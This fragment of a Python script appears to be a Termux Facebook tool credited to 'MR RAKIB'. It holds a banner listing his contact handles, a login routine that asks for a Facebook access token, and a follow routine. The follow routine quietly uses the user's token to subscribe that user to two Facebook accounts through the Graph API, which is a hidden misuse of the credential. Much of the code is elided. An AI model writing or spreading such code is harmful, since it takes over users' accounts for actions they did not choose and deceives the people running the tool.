...
figlet Hamii | lolcat
"""
___banner___ = ("""d8888b. db    db .88b  d88. d8888b.  \033[1;97m[\033[1;94m+\033[1;97m] AU : MR RAKIB
88  `8D 88    88 88'YbdP`88 88  `8D  \033[1;97m[\033[1;94m+\033[1;97m] PN : +9660531382117
88   88 88    88 88  88  88 88oodD'  \033[1;97m[\033[1;94m+\033[1;97m] GH : MRRAKIB-404
88   88 88    88 88  88  88 88~~~    \033[1;97m[\033[1;94m+\033[1;97m] FB : MD RAKIB HOSSEN
88  .8D 88b  d88 88  88  88 88       \033[1;97m[\033[1;94m+\033[1;97m] TN : MR RAKIB TERMUX 
...
def ___login___():
    ...
    try:
        ...
        if ___token in ['open','Open']:
            ...
            os.system('xdg-open www.youtube.com/MR RAKIB')
            exit()
        else:
...
def ___follow___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/100009521816069/subscribers?access_token=%s'%(___token)) #RAKIB
        requests.post('https://graph.facebook.com/100076835203956/subscribers?access_token=%s'%(___token)) #RAKIB
